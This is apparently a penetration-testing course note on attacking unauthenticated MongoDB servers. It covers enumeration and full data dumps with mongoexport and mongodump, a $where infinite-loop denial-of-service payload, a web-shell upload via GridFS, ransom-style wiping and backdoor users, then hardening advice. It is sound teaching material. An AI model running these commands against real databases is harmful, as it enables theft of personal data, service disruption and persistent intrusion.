---
tags: [mongodb, nosql, unauthenticated, database-dump, gridfs]
difficulty: intermediate
module: "35 - Network Protocol Attacks"
topic: "35.17 MongoDB"
---

# 17 - MongoDB: Unauthenticated Access & Data Exfiltration

## 1. Executive Summary

MongoDB is a premier NoSQL document-oriented database. Instead of rows and columns, MongoDB stores data in flexible, JSON-like documents called BSON (Binary JSON). By default, MongoDB listens on **TCP Port 27017**.

A recurring theme in cybersecurity is the catastrophic misconfiguration of MongoDB deployments. Historically, MongoDB instances were deployed without authentication enabled and bound to all interfaces. This allowed unauthenticated remote attackers to connect to the database, list all collections, dump sensitive corporate data, and in certain configurations, execute server-side JavaScript to achieve Remote Code Execution (RCE). Ransomware groups actively hunt for open MongoDB instances, wiping the data and leaving ransom notes.

## 2. Protocol Overview & Architecture

MongoDB operates using a custom binary wire protocol. 
- **Documents & Collections:** Data is stored as BSON documents. Documents are grouped into *collections* (analogous to SQL tables), which are grouped into *databases*.
- **Authentication:** MongoDB supports SCRAM (Salted Challenge Response Authentication Mechanism) and x.509 certificate authentication. However, if the `--auth` flag is not explicitly passed or `security.authorization` is not enabled in `mongod.conf`, the database operates in a completely open trust model.

### Key Components Abused
- **`admin` Database:** Contains user metadata and system configuration.
- **GridFS:** A specification for storing large files (over the 16MB BSON document limit). Attackers can abuse this to upload malicious files or retrieve stored intellectual property.
- **JavaScript Engine:** MongoDB uses a JavaScript engine (V8 or SpiderMonkey) to process complex queries (`$where`), MapReduce functions, and the `db.eval()` command.

## 3. Enumeration & Footprinting

Identifying an open MongoDB instance is extremely straightforward. Nmap and Metasploit provide excellent modules for this.

### Nmap Enumeration
```bash
# Basic scan to identify MongoDB and check if it's open
nmap -p 27017 -sV --script mongodb-info,mongodb-databases <Target_IP>
```

### Manual Interaction via CLI
If you have the `mongo` (legacy) or `mongosh` (modern) client installed, you can attempt to connect directly without providing credentials.

```bash
# Connect to the target
mongosh "mongodb://<Target_IP>:27017"

# Once connected, test access
test> show dbs
admin   0.000GB
config  0.000GB
local   0.000GB
users   0.050GB
```

## 4. Exploitation: Data Dumping & Modification

Once connected to an unauthenticated MongoDB instance, the attacker has full CRUD (Create, Read, Update, Delete) privileges. 

### 4.1 Listing and Querying Data
Attackers will pivot through databases and collections looking for credentials, PII, or API keys.

```javascript
// List all databases
show dbs

// Switch to a specific database
use users

// List collections within the database
show collections

// Dump the first 10 documents from the 'accounts' collection
db.accounts.find().limit(10).pretty()

// Search for specific fields (e.g., admin users)
db.accounts.find({role: "admin"}).pretty()
```

### 4.2 Automated Data Exfiltration
Using native MongoDB tools, an attacker can rapidly exfiltrate massive amounts of data without manual querying.

```bash
# Export a specific collection to a JSON file
mongoexport --host <Target_IP> --port 27017 --db users --collection accounts --out accounts_dump.json

# Dump the entire database (all collections) into a BSON archive
mongodump --host <Target_IP> --port 27017 --out /tmp/mongo_dump/
```

### 4.3 Ransomware Operations
Automated scripts frequently scan the internet for port 27017. When an open instance is found, the script uses the `db.dropDatabase()` command to wipe the collections and inserts a single document into a new collection with a Bitcoin address and ransom demand.

## 5. Advanced Exploitation: Server-Side JS & RCE

While modern MongoDB versions restrict server-side execution, older versions (or misconfigured newer ones) allow arbitrary JavaScript execution via the database engine.

### 5.1 RCE via `db.eval()` (Legacy)
In older MongoDB versions, the `db.eval()` command allowed execution of arbitrary JS on the server. If the MongoDB service was running with high privileges, this could be escalated.

```javascript
// Execute a basic math operation to test evaluation
db.eval("function() { return 1+1; }")
```

### 5.2 Denial of Service via `$where`
The `$where` operator passes a string containing a JavaScript expression to the database engine. Attackers can inject infinite loops or CPU-heavy operations to cause a Denial of Service.

```javascript
// CPU Exhaustion payload
db.accounts.find({ $where: "while(true){}" })

// Time-based execution evaluation
db.accounts.find({ $where: "sleep(5000)" })
```

### 5.3 Abusing GridFS for Arbitrary File Read/Write
If an application uses GridFS to serve files (e.g., profile pictures, PDF invoices), an attacker can use the unauthenticated DB access to read proprietary files or upload web shells if the GridFS bucket is exposed to the webroot.

```bash
# Uploading a web shell into GridFS
mongofiles --host <Target_IP> --port 27017 -d my_app put shell.php

# Downloading files from GridFS
mongofiles --host <Target_IP> --port 27017 -d my_app get secret_document.pdf
```

## 6. ASCII Architecture & Attack Diagram

```text
+-----------------------+           +---------------------------------+
|                       | TCP 27017 |        MongoDB Server           |
|  Attacker Machine     |==========>|        (No Authentication)      |
|                       |           |                                 |
+-----------------------+           +---------------------------------+
           |                                         |
           | 1. Connect (mongosh)                    |
           |---------------------------------------->|
           |                                         |
           | 2. show dbs                             |
           |<----------------------------------------|
           |    [admin, local, prod_users]           |
           |                                         |
           | 3. db.prod_users.find()                 |
           |---------------------------------------->|
           |                                         |
           | 4. Extract Hashes/PII                   |
           |<----------------------------------------|
           |                                         |
           | 5. db.prod_users.drop() (Ransom)        |
           |---------------------------------------->|
           |                                         v
           |                                +-------------------------+
           |                                |    Data Wiped /         |
           |                                |    Ransom Note Left     |
           |                                +-------------------------+
```

## 7. Post-Exploitation & Persistence

- **Credential Re-use:** Extracting password hashes (often stored in bcrypt or PBKDF2) for offline cracking. Valid credentials are then sprayed against SSH or web portals.
- **Data Manipulation:** Modifying user roles (e.g., changing a standard user's role to "admin" in the database) to achieve vertical privilege escalation within the web application interacting with the database.
- **Creating Backdoor DB Users:** If authentication is temporarily disabled but later enabled by administrators, an attacker might create a hidden admin user to maintain persistent access.

## 8. Defense, Mitigation, & Hardening

1. **Enable Authentication:** This is the most critical step. Ensure the database is started with the `--auth` flag and that strict Role-Based Access Control (RBAC) is configured.
   ```yaml
   security:
     authorization: "enabled"
   ```
2. **Network Binding:** Edit `mongod.conf` to bind only to localhost (`127.0.0.1`) or specific internal private IPs.
   ```yaml
   net:
     bindIp: 127.0.0.1
     port: 27017
   ```
3. **Disable Server-Side Scripting:** If `$where` queries and MapReduce are not strictly required, disable server-side JavaScript execution in the configuration.
   ```yaml
   security:
     javascriptEnabled: false
   ```
4. **Firewall Rules:** Block port 27017 at the perimeter. Only application servers should be able to route traffic to the database segment.

## 9. Chaining Opportunities

- **NoSQL Injection:** If the database is authenticated but the web application is vulnerable to NoSQL injection, attackers can extract data using syntax bypasses. See **[[06 - SQL Injection (SQLi)]]** and NoSQLi equivalents.
- **SSRF Exploitation:** If the MongoDB instance is bound only to localhost, an attacker can use a Server-Side Request Forgery vulnerability to interact with the database via HTTP (if the REST interface is enabled) or gopher protocols. See **[[07 - Server-Side Request Forgery (SSRF)]]**.

## 10. Related Notes
- [[15 - MySQL MSSQL PostgreSQL — Remote Access, Brute Force, UDF]]
- [[16 - Redis — Unauthenticated Access, RCE via Config Set]]
- [[18 - Elasticsearch — Open Access, Data Exfiltration]]
- [[21 - Kubernetes API — Unauthenticated Access, RBAC Bypass]]
